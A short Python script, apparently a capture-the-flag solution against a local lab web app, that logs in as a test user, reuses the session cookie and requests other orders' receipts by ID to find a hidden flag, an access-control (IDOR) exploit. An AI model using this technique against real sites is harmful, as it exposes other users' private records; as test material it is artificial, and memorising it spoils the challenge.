import requests
import re

# Target base URL
BASE_URL = "http://127.0.0.1:32780"

# Initialize session
session = requests.Session()

print("[*] Authenticating...")

# Authenticate
session.post(f"{BASE_URL}/", data={"username": "test"})
auth_response = session.post(
    f"{BASE_URL}/password/test",
    data={"username": "test", "user_id": "10032", "password": "test"}
)

# Extract and set session cookie manually
set_cookie_header = auth_response.headers.get('Set-Cookie', '')
if 'session=' in set_cookie_header:
    session_value = set_cookie_header.split('session=')[1].split(';')[0]
    session.cookies.set('session', session_value, domain='127.0.0.1', path='/')

print(f"[+] Authenticated with session: {session_value[:30]}...\n")

# Check anomalous orders (different sizes)
anomalous_orders = [300123, 300214, 300327]

print("[*] Examining anomalous order receipts...\n")

for order_id in anomalous_orders:
    response = session.get(f"{BASE_URL}/order/{order_id}/receipt", allow_redirects=False)
    
    print(f"{'='*80}")
    print(f"[*] Order ID: {order_id}")
    print(f"[*] Status: {response.status_code}")
    print(f"[*] Content-Length: {len(response.text)}B")
    print(f"{'='*80}")
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        flag_value = flag_match.group(0)
        print(f"\n[!!!] FLAG FOUND in order {order_id}:")
        print(f"[!!!] {flag_value}\n")
    
    # Print full response
    print(f"Full Response:\n{response.text}\n")
    print(f"{'='*80}\n")

